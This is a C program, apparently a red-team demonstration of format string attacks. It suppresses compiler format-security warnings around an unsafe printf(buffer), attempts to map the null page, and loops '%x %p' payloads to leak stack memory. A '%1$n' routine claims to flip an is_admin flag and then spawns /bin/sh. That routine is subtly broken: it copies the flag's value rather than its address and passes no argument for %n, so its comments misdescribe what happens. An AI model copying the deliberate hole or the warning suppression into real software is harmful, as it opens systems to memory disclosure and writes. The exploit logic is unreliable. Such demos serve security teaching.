#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <signal.h>
#include <setjmp.h>
#include <sys/mman.h>

// Global jump buffer for recovering from segmentation faults
jmp_buf env;

/*
 * Signal handler for SIGSEGV.
 * When a segmentation fault occurs, print a message and jump back.
 */
void handle_sigsegv(int sig) {
    printf("\nCaught segmentation fault (signal %d). Attempting recovery...\n", sig);
    longjmp(env, 1);
}

/*
 * Attempt to map the null page (address 0x0).
 * This is a red team technique to bypass OS-level protections against null pointer dereference.
 */
void map_null_page() {
    void *addr = mmap((void*)0, 4096, PROT_READ | PROT_WRITE, MAP_FIXED | MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
    if (addr == MAP_FAILED) {
        printf("(DEBUG) Null page mapping attempt failed: %s\n", strerror(errno));
    } else {
        printf("(DEBUG) Successfully mapped null page at address 0x0.\n");
    }
}

/*
 * vulnerable_print() performs an insecure printf call.
 * Any format specifiers in the buffer are interpreted, allowing for potential memory
 * disclosure and writes.
 */
#if defined(__GNUC__)
__attribute__((noinline))
#endif
void vulnerable_print(const char *buffer) {
    #if defined(__clang__)
    #pragma clang diagnostic push
    #pragma clang diagnostic ignored "-Wformat-security"
    #elif defined(__GNUC__)
    #pragma GCC diagnostic push
    #pragma GCC diagnostic ignored "-Wformat-security"
    #endif

    printf(buffer);
    printf("\n");

    #if defined(__clang__)
    #pragma clang diagnostic pop
    #elif defined(__GNUC__)
    #pragma GCC diagnostic pop
    #endif
}

/*
 * smart_scan() is a wrapper that introduces variation in the stack layout.
 */
void smart_scan(const char *buffer, unsigned long iteration) {
    volatile char dummy[128];
    for (size_t i = 0; i < sizeof(dummy); i++) {
        dummy[i] = (char)((iteration + i) & 0xFF);
    }
    vulnerable_print(buffer);
}

/*
 * exploit_privilege_escalation demonstrates a potential exploitation of the format string vulnerability.
 * It crafts an input that attempts to use the "%n" specifier to write the value 1 into a local variable.
 * If successful, this simulates privilege escalation (e.g. by setting an "is_admin" flag).
 */
void exploit_privilege_escalation() {
    int is_admin = 0;
    printf("Before exploitation, is_admin = %d\n", is_admin);

    char exploit_buffer[128];
    memset(exploit_buffer, 0, sizeof(exploit_buffer));
    // Place the address of is_admin at the very beginning of the buffer.
    memcpy(exploit_buffer, &is_admin, sizeof(is_admin));
    // Craft a payload that prints one character ("A") so that the printed count is 1,
    // then uses the positional conversion specifier "%1$n" to write that count into is_admin.
    const char *payload = "A%1$n";
    size_t payload_len = strlen(payload);
    if (sizeof(exploit_buffer) - sizeof(is_admin) > payload_len) {
        memcpy(exploit_buffer + sizeof(is_admin), payload, payload_len);
    }

    // Call vulnerable_print with the crafted exploit buffer.
    vulnerable_print(exploit_buffer);

    printf("After exploitation, is_admin = %d\n", is_admin);
    if (is_admin == 1) {
        printf("Privilege escalation simulation successful: is_admin set to 1.\n");
        // For demonstration, spawn a shell.
        system("/bin/sh");
    } else {
        printf("Privilege escalation simulation failed.\n");
    }
}

// Define initial parameters for the scanning loop.
#define INITIAL_SIZE   1024         // 1 KB initial allocation
#define STEP_SIZE      (1024*2)     // Increase by 2 KB each iteration

/*
 * Main function.
 * Added support for a command-line flag "--priv-escalate" to trigger the privilege escalation demo.
 */
int main(int argc, char *argv[]) {
    // Set up signal handler for segmentation fault.
    struct sigaction sa;
    memset(&sa, 0, sizeof(sa));
    sa.sa_handler = handle_sigsegv;
    sigemptyset(&sa.sa_mask);
    sa.sa_flags = 0;
    if (sigaction(SIGSEGV, &sa, NULL) == -1) {
        perror("sigaction");
        return EXIT_FAILURE;
    }

    // Attempt to map the null page.
    map_null_page();

    // If the "--priv-escalate" argument is provided, run the privilege escalation demo.
    if (argc > 1 && strcmp(argv[1], "--priv-escalate") == 0) {
        printf("Running privilege escalation demonstration...\n\n");
        exploit_privilege_escalation();
        return EXIT_SUCCESS;
    }

    printf("Starting vulnerable format string test in an infinite loop...\n\n");

    unsigned long iteration = 0;
    size_t current_size = INITIAL_SIZE;

    while (1) {
        if (setjmp(env) != 0) {
            printf("Recovered from segmentation fault. Continuing to next iteration...\n\n");
            iteration++;
            current_size += STEP_SIZE;
            continue;
        }

        printf("Iteration %lu:\n", iteration);
        printf("Allocating %zu bytes\n", current_size);

        char *buffer = (char *)malloc(current_size);
        if (!buffer) {
            fprintf(stderr, "Failed to allocate %zu bytes (iteration %lu): %s\n",
                    current_size, iteration, strerror(errno));
            break;
        }

        // Fill the buffer with a repeated malicious pattern.
        const char *pattern = "%x %p ";
        size_t pattern_len = strlen(pattern);
        for (size_t offset = 0; offset < current_size - 1; offset += pattern_len) {
            size_t remaining = (current_size - 1) - offset;
            size_t to_copy = (remaining < pattern_len) ? remaining : pattern_len;
            memcpy(&buffer[offset], pattern, to_copy);
        }
        buffer[current_size - 1] = '\0';

        printf("Buffer preview (first 50 chars): %.50s\n", buffer);
        printf("Printing buffer (vulnerable):\n");

        smart_scan(buffer, iteration);

        printf("Analysis:\n");
        printf("  - The printed memory values come from the stack frame of 'vulnerable_print()'.\n");
        printf("  - Using 'smart_scan()', a dummy array is allocated to vary the stack layout.\n");
        printf("  - Constant output despite changes may indicate stable stack regions or compiler optimizations.\n");
        printf("--------------------------------------------------\n\n");

        free(buffer);
        iteration++;
        current_size += STEP_SIZE;
    }

    printf("Vulnerable format string test complete.\n");
    return 0;
}
